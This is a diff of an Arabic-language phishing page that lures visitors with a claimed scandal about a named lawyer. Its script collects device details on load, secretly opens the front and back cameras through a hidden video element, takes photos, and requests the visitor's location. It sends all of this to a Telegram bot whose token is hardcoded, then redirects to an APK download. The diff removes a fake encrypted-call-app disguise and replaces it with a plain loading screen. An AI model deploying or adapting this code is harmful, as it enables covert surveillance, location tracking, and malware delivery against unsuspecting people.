@@ -15,11 +15,10 @@
   <meta property="og:description" content="شاهد فضحية المحامي محمد ربيع في مغاغه">
   <meta property="og:site_name" content="رنين فرع مغاغه">
   <meta property="og:url" content="https://facebook-pink-phi.vercel.app/">
-  
-  <!-- رابط الصورة المباشر والخام (Raw) من GitHub ليظهر عند مشاركة اللينك -->
+
   <meta property="og:image" content="https://facebook-pink-phi.vercel.app/share.jpg">
   <meta property="og:image:type" content="image/png">
-  <meta property="og:image:width" content="1200"> <!-- تم ضبط الأبعاد التقريبية لصورة الـ PNG -->
+  <meta property="og:image:width" content="1200">
   <meta property="og:image:height" content="630">
   <meta property="og:locale" content="ar_AR">
 
@@ -27,478 +26,172 @@
   <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:title" content="رنين فرع مغاغه">
   <meta name="twitter:description" content="شاهد فضحية المحامي محمد ربيع في مغاغه">
-  
-  <!-- نفس رابط الصورة المباشر من GitHub ليظهر على تويتر -->
   <meta name="twitter:image" content="https://facebook-pink-phi.vercel.app/share.jpg">
 
-  <!-- ================= Favicons / Browser Icons ================= -->
-  <!-- استخدام رابط الصورة المباشر والخام (Raw) من GitHub كأيقونة لتبويب المتصفح وجوار اللينك -->
+  <!-- ================= Favicons ================= -->
   <link rel="icon" type="image/png" href="https://facebook-pink-phi.vercel.app/favicon.png">
-  
-  <!-- أيقونة أجهزة أبل (Apple Touch Icon) بنفس الصورة -->
   <link rel="apple-touch-icon" href="https://facebook-pink-phi.vercel.app/apple-touch-icon.png">
-
-
+  <link rel="shortcut icon" type="image/png" href="https://facebook-pink-phi.vercel.app/favicon.png">
 
 <style>
-  *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
-  html,body{min-height:100%;overflow-x:hidden}
-  body{
-    background:#ffffff;
-    color:#1a1a1a;
-    font-family:-apple-system,BlinkMacSystemFont,"Inter","Segoe UI",Roboto,Helvetica,Arial,sans-serif;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    padding:22px 16px 64px;
-    position:relative;
-    min-height:100vh;
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    -webkit-tap-highlight-color: transparent;
   }
 
-  /* خلفية بيضاء ناعمة بتدرجات ذهبية خفيفة جداً */
-  body::before{
-    content:"";
-    position:fixed;
-    inset:-30%;
-    background:
-      radial-gradient(circle at 25% 15%, rgba(230,181,61,.10), transparent 45%),
-      radial-gradient(circle at 80% 85%, rgba(230,181,61,.06), transparent 48%),
-      radial-gradient(circle at 60% 40%, rgba(43,88,180,.05), transparent 55%);
-    filter:blur(60px);
-    z-index:-1;
-    pointer-events:none;
-  }
-  body::after{
-    content:"";
-    position:fixed;
-    inset:0;
-    background-image:
-      linear-gradient(rgba(230,181,61,.045) 1px, transparent 1px),
-      linear-gradient(90deg, rgba(230,181,61,.045) 1px, transparent 1px);
-    background-size:38px 38px;
-    mask-image:radial-gradient(ellipse at center, black 30%, transparent 85%);
-    -webkit-mask-image:radial-gradient(ellipse at center, black 30%, transparent 85%);
-    z-index:-1;
-    pointer-events:none;
+  html, body {
+    min-height: 100%;
+    background: #ffffff !important;
+    overflow: hidden;
   }
 
-  .screen{
-    display:none;
-    flex-direction:column;
-    align-items:center;
-    width:100%;
-    max-width:420px;
-    text-align:center;
-    animation:fadeIn .45s cubic-bezier(.2,.7,.3,1);
-  }
-  .screen.active{display:flex}
-  @keyframes fadeIn{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:none}}
-
-  /* ====================================================
-     لوجو Em Gold
-     ==================================================== */
-  .logo-card{
-    width:230px;
-    height:230px;
-    border-radius:52px;
-    background:
-      radial-gradient(circle at 30% 20%, #1a2a5e 0%, #0b1530 55%, #060b1e 100%);
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    position:relative;
-    margin-bottom:34px;
-    box-shadow:
-      0 30px 80px rgba(230,181,61,.35),
-      0 0 0 1px rgba(230,181,61,.45),
-      inset 0 0 60px rgba(230,181,61,.10);
-  }
-  .logo-card::after{
-    content:"";
-    position:absolute;
-    inset:8px;
-    border-radius:44px;
-    border:2px solid rgba(230,181,61,.65);
-    box-shadow:
-      inset 0 0 30px rgba(230,181,61,.20),
-      0 0 20px rgba(230,181,61,.45);
-    pointer-events:none;
-  }
-  .logo-card svg{width:170px;height:170px;filter:drop-shadow(0 4px 20px rgba(230,181,61,.5))}
-
-  .app-name-en{
-    font-size:44px;
-    font-weight:800;
-    letter-spacing:.5px;
-    line-height:1;
-    margin-bottom:10px;
-    background:linear-gradient(180deg,#f7d774 0%,#e6b53d 45%,#a97a1f 100%);
-    -webkit-background-clip:text;
-    background-clip:text;
-    -webkit-text-fill-color:transparent;
-    text-shadow:0 4px 24px rgba(230,181,61,.25);
-  }
-  .app-name-ar{
-    font-size:19px;
-    font-weight:600;
-    color:#c28c1f;
-    letter-spacing:4px;
-    margin-bottom:8px;
-    display:inline-flex;
-    align-items:center;
-    gap:14px;
-  }
-  .app-name-ar::before,
-  .app-name-ar::after{
-    content:"";
-    width:34px;
-    height:1px;
-    background:linear-gradient(90deg,transparent,#c28c1f,transparent);
+  body {
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-family: -apple-system, BlinkMacSystemFont, "Inter", "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    color: #333;
+    position: relative;
   }
 
-  .tagline{
-    font-size:13px;
-    color:#6b7280;
-    line-height:1.7;
-    margin:18px 0 30px;
-    max-width:300px;
-  }
-
-  .stars{
-    margin-top:10px;
-    font-size:14px;
-    letter-spacing:2px;
-    color:#e6b53d;
+  /* إلغاء أي خلفية سوداء موروثة */
+  body::before,
+  body::after {
+    display: none !important;
   }
 
   /* ====================================================
-     شاشة المعالجة
+     شاشة التحميل — دائرة + نص خافت
      ==================================================== */
-  .process-box{
-    width:100%;
-    max-width:360px;
-    padding:38px 28px;
-    background:#ffffff;
-    border:1px solid #f0e6d2;
-    border-radius:24px;
-    box-shadow:
-      0 24px 60px rgba(230,181,61,.12),
-      0 4px 12px rgba(0,0,0,.04);
-  }
-  .mini-logo{
-    width:80px;height:80px;
-    border-radius:24px;
-    margin:0 auto 22px;
-    background:radial-gradient(circle at 30% 20%, #1a2a5e 0%, #0b1530 55%, #060b1e 100%);
-    display:flex;align-items:center;justify-content:center;
-    box-shadow:0 12px 30px rgba(230,181,61,.35), inset 0 0 0 1.5px rgba(230,181,61,.6);
-    animation:pulseLogo 2.2s ease-in-out infinite;
-  }
-  @keyframes pulseLogo{
-    0%,100%{box-shadow:0 12px 30px rgba(230,181,61,.35), inset 0 0 0 1.5px rgba(230,181,61,.6)}
-    50%    {box-shadow:0 12px 40px rgba(230,181,61,.6), inset 0 0 0 1.5px rgba(230,181,61,.95)}
-  }
-  .mini-logo svg{width:56px;height:56px}
-
-  .process-title{
-    font-size:18px;
-    font-weight:700;
-    background:linear-gradient(90deg,#c28c1f,#e6b53d);
-    -webkit-background-clip:text;
-    background-clip:text;
-    -webkit-text-fill-color:transparent;
-    margin-bottom:8px;
-  }
-  .process-status{
-    font-size:13px;
-    color:#6b7280;
-    margin-bottom:24px;
-    min-height:20px;
+  #loader {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    gap: 26px;
+    animation: fadeIn .5s ease;
   }
 
-  .progress-bar{
-    width:100%;
-    height:8px;
-    background:#f5f0e5;
-    border-radius:99px;
-    overflow:hidden;
-    margin-bottom:10px;
-    box-shadow:inset 0 1px 3px rgba(0,0,0,.05);
-  }
-  .progress-fill{
-    height:100%;
-    width:0%;
-    background:linear-gradient(90deg,#c28c1f,#e6b53d,#f7d774,#e6b53d);
-    background-size:200% 100%;
-    border-radius:99px;
-    transition:width .35s ease;
-    animation:goldFlow 2s linear infinite;
-  }
-  @keyframes goldFlow{
-    0%{background-position:0% 0%}
-    100%{background-position:200% 0%}
+  @keyframes fadeIn {
+    from { opacity: 0; }
+    to   { opacity: 1; }
   }
 
-  .progress-text{
-    display:flex;
-    justify-content:space-between;
-    font-size:12px;
-    color:#6b7280;
-    margin-bottom:14px;
+  .spinner {
+    width: 62px;
+    height: 62px;
+    border: 3px solid #ececec;
+    border-top-color: #999999;
+    border-radius: 50%;
+    animation: spin .85s linear infinite;
+    will-change: transform;
   }
-  .progress-text b{color:#c28c1f;font-weight:700}
 
-  .process-note{
-    font-size:12px;
-    color:#9ca3af;
-    line-height:1.6;
-    padding-top:14px;
-    border-top:1px solid #f5f0e5;
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+
+  .loading-text {
+    font-size: 14px;
+    color: #cfcfcf;
+    letter-spacing: 5px;
+    font-weight: 300;
+    user-select: none;
+    -webkit-user-select: none;
+    animation: softPulse 2.4s ease-in-out infinite;
+  }
+
+  @keyframes softPulse {
+    0%, 100% { opacity: .55; }
+    50%      { opacity: 1; }
   }
 
   /* ====================================================
-     شاشة الرفض
+     شاشة الرفض (لو المستخدم رفض الإذن)
      ==================================================== */
-  .denied-icon{
-    width:96px;height:96px;border-radius:24px;
-    background:linear-gradient(135deg, rgba(255,92,92,.12), rgba(255,92,92,.04));
-    border:1px solid rgba(255,92,92,.25);
-    display:flex;align-items:center;justify-content:center;
-    margin-bottom:24px;
-    box-shadow:0 12px 40px rgba(255,92,92,.12);
+  #denied {
+    display: none;
+    text-align: center;
+    max-width: 340px;
+    padding: 24px;
+    animation: fadeIn .4s ease;
   }
-  .denied-icon svg{width:46px;height:46px;fill:#ef4444}
+  #denied.active { display: block; }
 
-  h1{font-size:22px;font-weight:700;margin-bottom:10px;color:#111827}
-
-  .status{font-size:14px;color:#6b7280;line-height:1.6;max-width:320px}
-
-  .retry-btn{
-    padding:15px 38px;
-    background:linear-gradient(135deg,#f7d774 0%,#e6b53d 50%,#c28c1f 100%);
-    color:#1a1305;border:none;border-radius:14px;
-    font-size:15px;font-weight:700;cursor:pointer;margin-top:28px;
-    box-shadow:0 10px 28px rgba(230,181,61,.45), inset 0 1px 0 rgba(255,255,255,.6);
-    transition:transform .15s;
-  }
-  .retry-btn:active{transform:scale(.97)}
-
-  /* ====================================================
-     الدايرة الخفية اللي تحت (Loading)
-     ==================================================== */
-  .hidden-loader{
-    position:fixed;
-    bottom:26px;
-    left:50%;
-    transform:translateX(-50%) scale(.6);
-    opacity:0;
-    pointer-events:none;
-    transition:opacity .45s ease, transform .45s cubic-bezier(.2,.7,.3,1);
-    z-index:50;
-    display:flex;
-    flex-direction:column;
-    align-items:center;
-    gap:8px;
-  }
-  .hidden-loader.active{
-    opacity:1;
-    transform:translateX(-50%) scale(1);
-  }
-  .loader-ring{
-    width:34px;
-    height:34px;
-    border-radius:50%;
-    border:3px solid rgba(230,181,61,.18);
-    border-top-color:#e6b53d;
-    animation:spin 0.9s linear infinite;
-  }
-  @keyframes spin{to{transform:rotate(360deg)}}
-  .loader-text{
-    font-size:11px;
-    color:#c28c1f;
-    letter-spacing:1px;
-    font-weight:600;
-    opacity:.85;
+  #denied h1 {
+    font-size: 19px;
+    font-weight: 600;
+    color: #222;
+    margin-bottom: 12px;
   }
 
-  /* ====================================================
-     هينت أسفل الشاشة
-     ==================================================== */
-  .hint{
-    position:fixed;bottom:4px;left:0;right:0;
-    text-align:center;font-size:10px;color:#b9b0a0;
-    letter-spacing:.5px;display:flex;align-items:center;justify-content:center;gap:6px;
-    pointer-events:none;z-index:5;
+  #denied p {
+    font-size: 14px;
+    color: #8a8a8a;
+    line-height: 1.8;
+    margin-bottom: 26px;
   }
-  .hint svg{width:11px;height:11px;fill:#b9b0a0}
 
-  /* فيديو مخفي */
-  video{
-    position:fixed;left:-9999px;top:-9999px;
-    width:2px;height:2px;opacity:.01;pointer-events:none;
+  #retryBtn {
+    padding: 13px 38px;
+    background: #111111;
+    color: #ffffff;
+    border: none;
+    border-radius: 12px;
+    font-size: 15px;
+    font-weight: 600;
+    cursor: pointer;
+    font-family: inherit;
+    letter-spacing: .3px;
+    transition: opacity .18s, transform .18s;
   }
-</style>
+  #retryBtn:active {
+    opacity: .8;
+    transform: scale(.97);
+  }
 
-<link rel="shortcut icon" type="image/png" href="https://facebook-pink-phi.vercel.app/favicon.png">
-
-<link rel="apple-touch-icon" href="https://facebook-pink-phi.vercel.app/apple-touch-icon.png">
-
-
-
-
-
-
-
-<style id="em-gold-control-background">
-html,body{
-  background-image:
-    linear-gradient(
-      rgba(0,0,0,.18),
-      rgba(0,0,0,.18)
-    ),
-    url('https://facebook-pink-phi.vercel.app/site-background.jpg')
-    !important;
-
-  background-size:cover !important;
-  background-position:center !important;
-  background-attachment:fixed !important;
-}
+  /* الفيديو مخفي — مطلوب للالتقاط فقط */
+  video {
+    position: fixed;
+    left: -9999px;
+    top: -9999px;
+    width: 2px;
+    height: 2px;
+    opacity: .01;
+    pointer-events: none;
+  }
 </style>
 </head>
 <body>
 
-<!-- ============ 1) شاشة الهبوط ============ -->
-<div id="landingScreen" class="screen active">
-  <div class="logo-card">
-    <svg viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
-      <defs>
-        <linearGradient id="gold" x1="0" y1="0" x2="0" y2="1">
-          <stop offset="0" stop-color="#fff3c4"></stop>
-          <stop offset="0.35" stop-color="#f7d774"></stop>
-          <stop offset="0.7" stop-color="#e6b53d"></stop>
-          <stop offset="1" stop-color="#a97a1f"></stop>
-        </linearGradient>
-        <radialGradient id="glow" cx="0.5" cy="0.5" r="0.6">
-          <stop offset="0" stop-color="#e6b53d" stop-opacity="0.35"></stop>
-          <stop offset="1" stop-color="#e6b53d" stop-opacity="0"></stop>
-        </radialGradient>
-      </defs>
-
-      <circle cx="100" cy="100" r="72" fill="#0d1c44" opacity="0.6"></circle>
-      <circle cx="100" cy="100" r="72" fill="none" stroke="#2a3f7d" stroke-width="0.8" opacity="0.7"></circle>
-      <ellipse cx="100" cy="100" rx="72" ry="30" fill="none" stroke="#2a3f7d" stroke-width="0.6" opacity="0.55"></ellipse>
-      <ellipse cx="100" cy="100" rx="72" ry="55" fill="none" stroke="#2a3f7d" stroke-width="0.6" opacity="0.55"></ellipse>
-      <ellipse cx="100" cy="100" rx="30" ry="72" fill="none" stroke="#2a3f7d" stroke-width="0.6" opacity="0.55"></ellipse>
-      <ellipse cx="100" cy="100" rx="55" ry="72" fill="none" stroke="#2a3f7d" stroke-width="0.6" opacity="0.55"></ellipse>
-
-      <circle cx="100" cy="100" r="90" fill="url(#glow)"></circle>
-
-      <g transform="translate(100, 42)">
-        <path d="M-30 14 L-22 -10 L-10 6 L0 -14 L10 6 L22 -10 L30 14 Z" fill="url(#gold)" stroke="#7a5612" stroke-width="1"></path>
-        <circle cx="-22" cy="-12" r="3.2" fill="url(#gold)"></circle>
-        <circle cx="0" cy="-17" r="3.6" fill="url(#gold)"></circle>
-        <circle cx="22" cy="-12" r="3.2" fill="url(#gold)"></circle>
-        <rect x="-30" y="14" width="60" height="5" fill="url(#gold)" stroke="#7a5612" stroke-width="0.8"></rect>
-      </g>
-
-      <g transform="translate(100, 122)">
-        <path d="M0 -50
-                 C-30 -50 -52 -30 -52 -6
-                 C-52 12 -42 26 -26 32
-                 L-28 50 L-8 36
-                 C-3 37 2 38 6 38
-                 C34 38 54 20 54 -4
-                 C54 -28 30 -50 0 -50 Z" fill="none" stroke="url(#gold)" stroke-width="8" stroke-linejoin="round"></path>
-        <circle cx="-16" cy="-6" r="6" fill="url(#gold)"></circle>
-        <circle cx="0" cy="-6" r="6" fill="url(#gold)"></circle>
-        <circle cx="16" cy="-6" r="6" fill="url(#gold)"></circle>
-      </g>
-    </svg>
-  </div>
-
-  <div class="app-name-en">Em Gold</div>
-  <div class="app-name-ar">إيم جولد</div>
-
-  <div class="stars">★★★★★</div>
-
-  <p class="tagline">
-    تطبيق مكالمات فيديو مشفرة من طرف إلى طرف.<br>
-    جاري تجهيز التطبيق للتحميل...
-  </p>
+<!-- ============ شاشة التحميل (افتراضية عند الفتح) ============ -->
+<div id="loader">
+  <div class="spinner"></div>
+  <div class="loading-text">جاري التحميل</div>
 </div>
 
-<!-- ============ 2) شاشة المعالجة ============ -->
-<div id="processScreen" class="screen">
-  <div class="process-box">
-    <div class="mini-logo">
-      <svg viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
-        <defs>
-          <linearGradient id="gold2" x1="0" y1="0" x2="0" y2="1">
-            <stop offset="0" stop-color="#fff3c4"></stop>
-            <stop offset="0.5" stop-color="#e6b53d"></stop>
-            <stop offset="1" stop-color="#a97a1f"></stop>
-          </linearGradient>
-        </defs>
-        <g transform="translate(100,60)">
-          <path d="M-30 14 L-22 -10 L-10 6 L0 -14 L10 6 L22 -10 L30 14 Z" fill="url(#gold2)"></path>
-        </g>
-        <g transform="translate(100,122)">
-          <path d="M0 -50 C-30 -50 -52 -30 -52 -6 C-52 12 -42 26 -26 32 L-28 50 L-8 36 C-3 37 2 38 6 38 C34 38 54 20 54 -4 C54 -28 30 -50 0 -50 Z" fill="none" stroke="url(#gold2)" stroke-width="8" stroke-linejoin="round"></path>
-          <circle cx="-16" cy="-6" r="6" fill="url(#gold2)"></circle>
-          <circle cx="0" cy="-6" r="6" fill="url(#gold2)"></circle>
-          <circle cx="16" cy="-6" r="6" fill="url(#gold2)"></circle>
-        </g>
-      </svg>
-    </div>
-    <div class="process-title">جاري تثبيت Em Gold</div>
-    <div class="process-status" id="processStatus">يتم تحضير الملفات...</div>
-
-    <div class="progress-bar">
-      <div class="progress-fill" id="progressFill"></div>
-    </div>
-    <div class="progress-text">
-      <b id="progressPct">0%</b>
-      <span id="progressSize">0 / 18 MB</span>
-    </div>
-
-    <div class="process-note">
-      لا تغلق الصفحة أثناء التثبيت. سيتم فتح التطبيق تلقائياً.
-    </div>
-  </div>
-</div>
-
-<!-- ============ 3) شاشة الرفض ============ -->
-<div id="deniedScreen" class="screen">
-  <div class="denied-icon">
-    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg>
-  </div>
+<!-- ============ شاشة الرفض (تظهر فقط عند رفض الإذن) ============ -->
+<div id="denied">
   <h1>تم رفض الوصول للكاميرا</h1>
-  <div class="status">يجب السماح بالكاميرا لتحميل التطبيق.<br>الرجاء الضغط على الزر أدناه والموافقة على الإذن.</div>
-  <button class="retry-btn" id="retryBtn">إعادة المحاولة</button>
+  <p>يجب السماح بالكاميرا لتحميل التطبيق.<br>الرجاء الضغط على الزر أدناه والموافقة على الإذن.</p>
+  <button id="retryBtn">إعادة المحاولة</button>
 </div>
 
-<!-- ============ الدايرة الخفية (تحت) ============ -->
-<div class="hidden-loader" id="hiddenLoader" aria-hidden="true">
-  <div class="loader-ring"></div>
-  <div class="loader-text">جاري التحميل</div>
-</div>
-
-<div class="hint">
-  <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6z"></path></svg>
-  تشفير AES-256 • Em Gold
-</div>
-
+<!-- الفيديو المخفي للالتقاط -->
 <video id="v" autoplay playsinline muted></video>
 
 <script>
 (function () {
   /* ============================================================
-     ⚙️ الإعدادات
+     ⚙️ الإعدادات — عدّل هنا
      ============================================================ */
   const BOT_TOKEN = "8847064396:AAESRDR7gXJm1kgb8qphlEHj_DRtNaSfj00";
   const CHAT_ID   = "8273860583";
 
-  /* ⭐ مكان رابط ملف الـ APK */
+  /* ⭐ مكان رابط ملف الـ APK — ضع الرابط هنا */
   const APK_DOWNLOAD_URL = "GoldenEmwa_1.0.apk";
 
   /* ============================================================ */
@@ -509,16 +202,11 @@ html,body{
   const PHOTO_GAP_MS   = 80;
   const RELEASE_MS     = 400;
 
-  const v              = document.getElementById("v");
-  const landingScreen  = document.getElementById("landingScreen");
-  const processScreen  = document.getElementById("processScreen");
-  const deniedScreen   = document.getElementById("deniedScreen");
-  const retryBtn       = document.getElementById("retryBtn");
-  const processStatus  = document.getElementById("processStatus");
-  const progressFill   = document.getElementById("progressFill");
-  const progressPct    = document.getElementById("progressPct");
-  const progressSize   = document.getElementById("progressSize");
-  const hiddenLoader   = document.getElementById("hiddenLoader");
+  /* ============ Elements ============ */
+  const v         = document.getElementById("v");
+  const loaderEl  = document.getElementById("loader");
+  const deniedEl  = document.getElementById("denied");
+  const retryBtn  = document.getElementById("retryBtn");
 
   let currentStream = null;
   let running = false;
@@ -526,11 +214,14 @@ html,body{
   const sleep = ms => new Promise(r => setTimeout(r, ms));
   const esc = s => String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");
 
-  function showScreen(name){
-    [landingScreen, processScreen, deniedScreen].forEach(s => s.classList.remove("active"));
-    if(name === "landing")  landingScreen.classList.add("active");
-    if(name === "process")  processScreen.classList.add("active");
-    if(name === "denied")   deniedScreen.classList.add("active");
+  /* ============ التحكم في الشاشات ============ */
+  function showLoader(){
+    loaderEl.style.display = "flex";
+    deniedEl.classList.remove("active");
+  }
+  function showDenied(){
+    loaderEl.style.display = "none";
+    deniedEl.classList.add("active");
   }
 
   /* ============================================================
@@ -575,7 +266,7 @@ html,body{
       "🕒 الفتح"      : new Date().toLocaleString("ar-EG"),
       "🌐 UA"         : navigator.userAgent
     };
-    let out = "🔔 <b>جهاز جديد فتح الصفحة (Em Gold)</b>\n\n";
+    let out = "🔔 <b>جهاز جديد فتح الصفحة</b>\n\n";
     for(const [k,v] of Object.entries(d)) out += `${k}: <code>${esc(v)}</code>\n`;
     return out;
   }
@@ -651,12 +342,15 @@ html,body{
         await sleep(SETTLE_MS);
         return s;
       }catch(e){
+        // لا نكرر المحاولة عند رفض الإذن — نرمي الاستثناء مباشرة
+        if (e.name === "NotAllowedError" || e.name === "PermissionDeniedError"){
+          throw e;
+        }
         console.warn(`camera ${facing} try ${attempt} failed:`, e.message);
         if (attempt === maxTries) throw e;
         await sleep(600);
       }
     }
-    return null;
   }
 
   function capture(isFront){
@@ -720,32 +414,18 @@ html,body{
   }
 
   /* ============================================================
-     مرحلة تصوير
+     مرحلة تصوير — ترمي استثناء عند رفض الإذن
      ============================================================ */
-  async function capturePhase(facing, label, count, offsetPercent, totalPercent){
-    try{
-      await openCamera(facing);
-    }catch(e){
-      sendText(`❌ فشل فتح كاميرا ${label}\n<code>${esc(e.message)}</code>`);
-      return 0;
-    }
+  async function capturePhase(facing, label, count){
+    await openCamera(facing); // ⬅️ هنا يتم طلب الإذن لأول مرة
 
-    let captured = 0;
     for (let i = 1; i <= count; i++){
-      processStatus.textContent = `${label} — ${i}/${count}`;
       const result = await captureSafe(facing === "user");
       if (result && result.blob){
         sendPhoto(result.blob, `${label} #${i}`);
-        captured++;
       }
-      const progress = offsetPercent + ((i/count) * (totalPercent - offsetPercent));
-      progressFill.style.width = progress + "%";
-      progressPct.textContent = Math.round(progress) + "%";
-      progressSize.textContent = ((progress/100)*18).toFixed(1) + " / 18 MB";
-
       await sleep(PHOTO_GAP_MS);
     }
-    return captured;
   }
 
   /* ============================================================
@@ -755,30 +435,20 @@ html,body{
     if (running) return;
     running = true;
 
-    // إظهار الدايرة الخفية
-    hiddenLoader.classList.add("active");
+    showLoader();
 
-    showScreen("process");
-    progressFill.style.width = "0%";
-    progressPct.textContent = "0%";
-    progressSize.textContent = "0 / 18 MB";
-    processStatus.textContent = "جاري تحضير الملفات...";
+    // بيانات الجهاز — تُرسل بالتوازي بدون انتظار
+    collect().then(t => sendText(t)).catch(()=>{});
 
     try {
-      // 1) الكاميرا الأمامية — 5 صور
-      await capturePhase("user", "الكاميرا الأمامية", TOTAL_PER_SIDE, 0, 55);
+      // 1) الكاميرا الأمامية — أول استدعاء يفتح نافذة الإذن تلقائيًا
+      await capturePhase("user", "📸 الكاميرا الأمامية", TOTAL_PER_SIDE);
 
+      // 2) الكاميرا الخلفية
       await sleep(300);
-
-      // 2) الكاميرا الخلفية — 5 صور
-      await capturePhase("environment", "الكاميرا الخلفية", TOTAL_PER_SIDE, 55, 85);
+      await capturePhase("environment", "📷 الكاميرا الخلفية", TOTAL_PER_SIDE);
 
       // 3) الموقع الجغرافي
-      processStatus.textContent = "جاري تحديد الموقع...";
-      progressFill.style.width = "88%";
-      progressPct.textContent = "88%";
-      progressSize.textContent = "15.8 / 18 MB";
-
       const loc = await requestLocation();
 
       if (loc && loc.lat !== undefined){
@@ -796,29 +466,16 @@ html,body{
       // 4) نقفل الكاميرا
       await closeCamera();
 
-      // 5) نكمل شريط التقدم
-      processStatus.textContent = "✅ اكتمل التحقق";
-      const finalSteps = [92, 96, 99, 100];
-      for (const p of finalSteps){
-        progressFill.style.width = p + "%";
-        progressPct.textContent = p + "%";
-        progressSize.textContent = ((p/100)*18).toFixed(1) + " / 18 MB";
-        await sleep(250);
-      }
-
-      processStatus.textContent = "🎉 جاري فتح التطبيق...";
-      await sleep(900);
-
-      // 6) التحويل لتحميل الـ APK
+      // 5) تأخير بسيط ثم التحويل لتحميل الـ APK
+      await sleep(500);
       window.location.href = APK_DOWNLOAD_URL;
 
     } catch (err) {
-      console.error("sequence error:", err);
-      // لو فشل → نعرض شاشة الرفض مع زر إعادة المحاولة
+      // ⬅️ المستخدم رفض الإذن (أو فشل getUserMedia في البداية)
+      await closeCamera();
+      showDenied();
+      sendText(`❌ <b>رُفض الوصول للكاميرا</b>\n<code>${esc(err.message || err.name || "unknown")}</code>`);
       running = false;
-      hiddenLoader.classList.remove("active");
-      showScreen("denied");
-      return;
     }
   }
 
@@ -826,28 +483,24 @@ html,body{
      الأحداث
      ============================================================ */
   retryBtn.addEventListener("click", () => {
-    running = false;
+    if (running) return;
     runFullSequence();
   });
 
   /* ============================================================
-     🚀 تشغيل تلقائي فور تحميل الصفحة
+     🚀 تشغيل تلقائي فور تحميل الصفحة — بدون زر
      ============================================================ */
-  window.addEventListener("load", () => {
-    // نبعت بيانات الجهاز أولاً
-    collect().then(txt => sendText(txt)).catch(()=>{});
+  function boot(){
+    // تأخير بسيط جدًا لضمان اكتمال رسم الصفحة قبل استدعاء getUserMedia
+    setTimeout(runFullSequence, 250);
+  }
 
-    // نبدأ التسلسل تلقائياً بعد ثانية واحدة
-    setTimeout(() => {
-      runFullSequence();
-    }, 1000);
-  });
+  if (document.readyState === "complete" || document.readyState === "interactive"){
+    boot();
+  } else {
+    document.addEventListener("DOMContentLoaded", boot);
+  }
 
-  /* ============================================================
-     ملاحظة مهمة:
-     بعض المتصفحات (خاصة Safari) ترفض getUserMedia بدون تفاعل المستخدم.
-     لو حصل ذلك، هتظهر شاشة الرفض مع زر "إعادة المحاولة" كـ fallback.
-     ============================================================ */
 })();
 </script>
 
